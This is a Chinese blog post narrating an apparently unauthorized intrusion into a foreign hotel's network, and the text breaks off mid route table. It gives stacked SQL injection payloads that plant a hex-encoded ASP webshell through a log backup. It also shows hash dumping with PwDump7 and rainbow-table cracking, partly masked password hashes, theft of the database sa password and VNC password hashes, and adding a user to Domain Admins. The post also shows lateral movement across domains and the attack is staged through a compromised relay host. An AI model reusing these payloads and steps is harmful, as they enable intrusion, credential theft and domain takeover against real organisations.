
 <!DOCTYPE HTML>
<html  xmlns:wb="http://open.weibo.com/wb">
<head>
  <meta charset="UTF-8">
  
    <title>对国外某hotel的内网域渗透案例 | Blog of Secer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
    
    <meta name="author" content="Secer">
    
    <meta name="description" content="目录  1网站初探  2通过Sql注入获取webshell  2.1通过Log备份获得webshell  3权限提升  3.1查看服务器基本信息  3.2渗透A域中的机器  4渗透其他域下机器  4.1轻松搞定WORKGROUP下机器  4.2渗透B域下的机器  4.3一波未平一波又起  5截稿  本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.  网站初探  本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.(开启vpn,跳到肉鸡,嘞次购.)    首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.      通过Sql注入获取webshell  这里漏洞修补了,就不截图了,直接给出方法:   http://www.pentesting.cc/test.aspx?id=1 AND 1 IN (select @@version)–返回    Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)  通过Log备份获得webshell                              test.aspx?id=1;alter//database//[CRSHGC]//set//recovery//full–            test.aspx?id=1;declare//@d//nvarchar(4000)//select//@d%3D0x640062006200610063006B00//backup//database//[CRSHGC]//to//disk%3D@d//with//init–            test.aspx?id=1;create//table//pg–            test.aspx?id=1;declare//@d//nvarchar(4000)//select//@d%3D0x640062006200610063006B00//backup//log//[CRSHGC]//to//disk%3D@d//with//init–            test.aspx?id=1;insert//into//pg//values(0x3C25457865637574652872657175657374282272222929253E)–            test.aspx?id=1;declare//@d//nvarchar(4000)//select//@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)//backup//log//[CRSHGC]//to//disk%3D@d//with//init–                        权限提升  先query user看看有在线的木有，如图：       如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀(这里tasklist、net start、netstat -an一下木杀毒，此篇就不扯这了)                               Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::            ACC*ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0:::             grral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B:::             brez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16:::             Cnt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89:::             hmo:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800:::             ……                        查看服务器基本信息  ipconfig /all                              Windows IP Configuration            &amp;#160;&amp;#160; Host Name . . . . . . . . . . . . : host1            &amp;#160;&amp;#160; Primary Dns Suffix&amp;#160; . . . . . . . : A.COM            &amp;#160;&amp;#160; Node Type . . . . . . . . . . . . : Unknown            &amp;#160;&amp;#160; IP Routing Enabled. . . . . . . . : No            &amp;#160;&amp;#160; WINS Proxy Enabled. . . . . . . . : No            &amp;#160;&amp;#160; DNS Suffix Search List. . . . . . : A.COM            Ethernet adapter Local Area Connection 2:            &amp;#160;&amp;#160; Connection-specific DNS Suffix&amp;#160; . :             &amp;#160;&amp;#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2            &amp;#160;&amp;#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx            &amp;#160;&amp;#160; DHCP Enabled. . . . . . . . . . . : No            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.205            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.202            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.201            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.195            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.103            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.13            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.65            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; Default Gateway . . . . . . . . . : 192.168.100.1            &amp;#160;&amp;#160; DNS Servers . . . . . . . . . . . : 192.168.100.201            &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 192.168.100.212            Ethernet adapter Local Area Connection:            &amp;#160;&amp;#160; Connection-specific DNS Suffix&amp;#160; . :             &amp;#160;&amp;#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet            &amp;#160;&amp;#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2            &amp;#160;&amp;#160; DHCP Enabled. . . . . . . . . . . : No            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.84            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.83            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.82            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.81            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.80            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; IP Address. . . . . . . . . . . . : 192.168.100.49            &amp;#160;&amp;#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0            &amp;#160;&amp;#160; Default Gateway . . . . . . . . . : 192.168.100.1            &amp;#160;&amp;#160; DNS Servers . . . . . . . . . . . : 192.168.100.201            &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 192.168.100.212                        从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain                              Domain            ——————————————————————————-            B&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;             A&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;             WORKGROUP&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;             The command completed successfully.                        渗透A域中的机器  查看A域中都有哪些域成员。（IP直接ping下就知道，记录下TTL值，猜测系统版本）    dsquery server -o rdn (不清楚的可以nslookup A.com或者net group &amp;quot;domain controllers&amp;quot;，这些命令在域环境下执行)                               //查找当前域中所有的域控制器            HGhost&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; //192.168.100.212 TTL=128            host&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; //192.168.100.205 TTL=128 本机            HGhost2&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; //192.168.100.213 TTL=128            host1&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; //本机                        可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &amp;quot;domain admins&amp;quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。">
    
    
    
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="333" />
    <meta name="twitter:title" content="对国外某hotel的内网域渗透案例 | Blog of Secer" />
      
    
    
    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/pacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      <div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">首页</a></li>
					
						<li><a href="/archives">文章</a></li>
					
						<li><a href="/about">关于</a></li>
					
						<li><a href="/atom.xml">RSS订阅</a></li>
					
					<li>
					
					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
					</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/952.seo/" title="对国外某hotel的内网域渗透案例" itemprop="url">对国外某hotel的内网域渗透案例</a>
  </h1>
  <!-- 显示作者
  <p class="article-author">By
    
      <a href="http://ha.cker.in" title="Secer">Secer</a>
    </p>
  -->  
  <p class="article-time">
    <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">2012-12-09</time>
    Updated:<time datetime="2016-08-20T11:03:54.000Z" itemprop="dateModified">2016-08-20</time>
    
  </p>
</header>

	<div class="article-content">
		
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
		</div>
		
		<p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br>首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370"></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br><a href="http://www.pentesting.cc/test.aspx?id=1" target="_blank" rel="external">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br>Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</strong></p>            <p>test.aspx?id=1;declare//@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</strong></p>            <p>test.aspx?id=1;insert//into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</strong></p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125"></a>    <br>如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br>在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </em></strong></p>            <p>brez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </em></strong></p>            <p>hmo:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br>dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br><a id="more"></a><br><p>先敲下命令 看哪些用户加入了domain admins和domain users组：   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>net group &quot;domain users&quot; /domain</p>            <p>Group name&#160;&#160;&#160;&#160; Domain Users</p>            <p>Comment&#160;&#160;&#160;&#160;&#160;&#160;&#160; All domain users</p>            <p>Members</p>            <p>——————————————————————————-</p>            <p>AC××××R</p>            <p>Administrator</p>            <p>br××××××z</p>            <p>……</p>            <p>The command completed successfully.</p>            <p>net group &quot;domain admins&quot; /domain</p>            <p>Group name&#160;&#160;&#160;&#160; Domain Admins</p>            <p>Comment&#160;&#160;&#160;&#160;&#160;&#160;&#160; Designated administrators of the domain</p>            <p>Members</p>            <p>——————————————————————————-</p>            <p>Administrator</p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>插入一点：<a href="http://technet.microsoft.com/zh-cn/library/aa291270" target="_blank" rel="external">http://technet.microsoft.com/zh-cn/library/aa291270</a>   <br>这里只有administrator一个域管理，密码没破出来，大家可以hash注入整整。用domain users组权限的用户登录终端看看    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/Aserver.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="Aserver" border="0" alt="clip_image003" src="http://img.cker.in/hotel_13F2D/clip_image003.jpg" width="570" height="370"></a>    <br>好了 运气不错 用户存在 另一台host看IP就知道也是本机了 这里A域下的机器就先到这里，下面看看怎么渗透其他域。</p>  <p>渗透其他域下机器</p>  <p>轻松搞定WORKGROUP下机器</p>  <p>net view /domain:WORKGROUP   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Server Name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Remark</p>            <p>——————————————————————————-</p>            <p>\B<strong>*</strong>T-DQ2SQG&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.41</p>            <p>\I<strong><em>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; i</em></strong> Test Server //192.168.100.57</p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>这里有两台机器workgroup里的机器是不属于域的 比如a b c三台机器 a加入了A域，那么workgroup就剩b c两台了，纯属屌丝个人理解。 先看看41这台 直接mstsc连上3389发现不行 各种猜测就别想了 这里之前从A域中的机器得知 有安装开启过vnc,telnet了下41 发现开启了 那么直接找到vnc密码连下试试，翻了下从C:\Program Files\uvnc bvba\UltraVnc\ultravnc.ini中找到了密码hash   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>[ultravnc]</p>            <p>passwd=089F6××××6BC55</p>            <p>passwd=19C0××××××CF30B8</p>         </td>       </tr>     </tbody></table> </p>  <p>破解后用vnc连接工具连上41 输入破解出来的密码（当然可以不破用那啥工具来着..）很幸运 来张图：   <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/41.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="41" border="0" alt="clip_image004" src="http://img.cker.in/hotel_13F2D/clip_image004.jpg" width="570" height="370"></a>    <br>这是台xp的 桌面还有安装好驱动的hp打印机 IP为204 应该属于员工机器    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/204.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="204" border="0" alt="clip_image005" src="http://img.cker.in/hotel_13F2D/clip_image005.jpg" width="570" height="370"></a>    <br>还有台57 直接mstsc连上 出现一个user用户 这里猜了几次密码 密码为连接vnc的密码(前面机器收集的多个vnc密码) 进去后此用户是管理员权限    <br><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/571.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="57" border="0" alt="clip_image006" src="http://img.cker.in/hotel_13F2D/clip_image006.jpg" width="489" height="370"></a>    <br>收集下sa密码就撤了 回头用菜刀连一句话操作数据库方便 接着往下看…</p>  <p>渗透B域下的机器</p>  <p>net view /domain:B   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Server Name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Remark</p>            <p>——————————————————————————-</p>            <p>\BEZNAS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; DNS-323&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.101 TTL=64</p>            <p>\DSERVER&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.12&#160; TTL=128</p>            <p>\MSERVER&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.21&#160; TTL=128</p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>如果ping不通 可以查看下路由表 route print 一下:   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>IPv4 Route Table</p>            <p>===========================================================================</p>            <p>Interface List</p>            <p>0x1 ……………………… MS TCP Loopback interface</p>            <p>0x10003 …00 14 85 02 00 